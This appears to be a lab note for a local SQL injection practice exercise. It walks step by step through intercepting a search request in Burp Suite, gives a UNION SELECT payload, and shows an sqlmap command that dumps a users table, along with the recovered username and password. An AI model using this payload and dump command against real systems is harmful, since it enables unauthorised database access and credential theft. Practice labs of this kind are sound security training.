@@ -1,0 +1,322 @@
+
+================================================================================
+                  SQL INJECTION AUTOMATION USING BURP SUITE + SQLMAP
+================================================================================
+                  
+
+OBJECTIVE
+---------
+Automate SQL Injection by:
+    1. Capturing the HTTP request using Burp Suite.
+    2. Saving the request.
+    3. Running SQLMap to automatically detect SQL Injection.
+    4. Dumping sensitive data from the vulnerable database table.
+
+--------------------------------------------------------------------------------
+STEP 1 : Launch Burp Suite
+--------------------------------------------------------------------------------
+
+Open Burp Suite Community Edition.
+
+    Kali Linux
+        ↓
+    Burp Suite
+        ↓
+    Temporary Project
+        ↓
+    Start Burp
+
+Navigate to:
+
+    Proxy
+      └── Intercept
+              └── Click "Intercept is ON"
+
+Purpose
+-------
+Burp Suite intercepts every HTTP request before it reaches the server.
+
+Result
+------
+✓ HTTP requests are now captured.
+
+--------------------------------------------------------------------------------
+STEP 2 : Trigger the Vulnerable Request
+--------------------------------------------------------------------------------
+
+Open Firefox.
+
+Navigate to:
+
+    http://localhost/
+
+Open:
+
+    Injection 0x03
+
+Enter the payload inside the Product Search field:
+
+    Tanjyoubi Sushi Rack'
+    UNION SELECT NULL,NULL,NULL,password FROM injection0x03_users#
+
+Click:
+
+    Search
+
+Flow
+
+Browser
+   │
+   ▼
+Burp Suite (Intercept ON)
+   │
+   ▼
+Captured HTTP POST Request
+
+Result
+------
+✓ Burp Suite captures the complete HTTP request.
+
+--------------------------------------------------------------------------------
+STEP 3 : Captured Request Contains
+--------------------------------------------------------------------------------
+
+The intercepted request includes:
+
+    ✓ HTTP Method
+    ✓ Headers
+    ✓ Cookies
+    ✓ POST Parameters
+
+These are all required by SQLMap.
+
+--------------------------------------------------------------------------------
+STEP 4 : Save the Request
+--------------------------------------------------------------------------------
+
+Open another terminal.
+
+Command
+
+    mousepad request.txt
+
+Paste the intercepted request.
+
+Save as:
+
+    request.txt
+
+Folder
+
+    request.txt
+
+Purpose
+-------
+SQLMap will replay this exact HTTP request.
+
+Result
+------
+✓ request.txt created successfully.
+
+--------------------------------------------------------------------------------
+STEP 5 : Run SQLMap
+--------------------------------------------------------------------------------
+
+Command
+
+    sqlmap -r request.txt -T injection0x03_users --dump
+
+Command Breakdown
+
+    -r request.txt
+        Load intercepted HTTP request.
+
+    -T injection0x03_users
+        Target table.
+
+    --dump
+        Dump every record from that table.
+
+Flow
+
+request.txt
+      │
+      ▼
+SQLMap
+      │
+      ▼
+Detect SQL Injection
+      │
+      ▼
+Dump Database
+
+--------------------------------------------------------------------------------
+STEP 6 : SQLMap Questions
+--------------------------------------------------------------------------------
+
+SQLMap asks several questions.
+
+Question 1
+
+    Skip payloads for other DBMS?
+
+Answer
+
+    Y
+
+Reason
+
+    Backend DBMS is MySQL.
+
+--------------------------------------------
+
+Question 2
+
+    Test additional MySQL payloads?
+
+Answer
+
+    N
+
+Reason
+
+    Default testing is sufficient.
+
+--------------------------------------------
+
+Question 3
+
+    Continue testing other parameters?
+
+Answer
+
+    Y
+
+--------------------------------------------------------------------------------
+STEP 7 : SQLMap Detects the Vulnerability
+--------------------------------------------------------------------------------
+
+Output
+
+    POST parameter 'product' appears to be injectable.
+
+Database Detected
+
+    MySQL
+
+Result
+
+    ✓ SQL Injection confirmed.
+
+--------------------------------------------------------------------------------
+STEP 8 : SQLMap Dumps the Database
+--------------------------------------------------------------------------------
+
+SQLMap automatically:
+
+    Detects Injection
+          │
+          ▼
+    Enumerates Table
+          │
+          ▼
+    Reads Records
+          │
+          ▼
+    Displays Credentials
+
+Final Output
+
++-----------+--------------------+
+| Username  | Password           |
++-----------+--------------------+
+| takeshi   | onigirigadaisuki   |
++-----------+--------------------+
+
+Result
+
+✓ Username extracted.
+✓ Password extracted.
+
+--------------------------------------------------------------------------------
+COMPLETE WORKFLOW
+--------------------------------------------------------------------------------
+
+Start Burp Suite
+        │
+        ▼
+Enable Intercept
+        │
+        ▼
+Open Vulnerable Website
+        │
+        ▼
+Submit Search Payload
+        │
+        ▼
+Capture HTTP Request
+        │
+        ▼
+Save as request.txt
+        │
+        ▼
+Run SQLMap
+        │
+        ▼
+SQLMap Detects SQL Injection
+        │
+        ▼
+Database Enumeration
+        │
+        ▼
+Credentials Dumped
+
+--------------------------------------------------------------------------------
+COMMANDS USED
+--------------------------------------------------------------------------------
+
+Create request file
+
+    mousepad request.txt
+
+Run SQLMap
+
+    sqlmap -r request.txt -T injection0x03_users --dump
+
+--------------------------------------------------------------------------------
+EXPECTED OUTPUT
+--------------------------------------------------------------------------------
+
+[+] POST parameter 'product' appears to be injectable.
+
+[+] Back-end DBMS: MySQL
+
+Database Table:
+
+    injection0x03_users
+
+Extracted Data
+
++-----------+--------------------+
+| Username  | Password           |
++-----------+--------------------+
+| takeshi   | onigirigadaisuki   |
++-----------+--------------------+
+
+--------------------------------------------------------------------------------
+KEY TAKEAWAYS
+--------------------------------------------------------------------------------
+
+✓ Burp Suite captures HTTP requests.
+✓ Save the intercepted request as request.txt.
+✓ SQLMap loads the request using -r.
+✓ SQLMap automatically detects SQL Injection.
+✓ SQLMap identifies the backend DBMS.
+✓ SQLMap dumps database records using --dump.
+✓ Sensitive credentials can be extracted automatically if the application is
+  vulnerable.
+
+================================================================================
+END OF NOTE
+================================================================================
+```
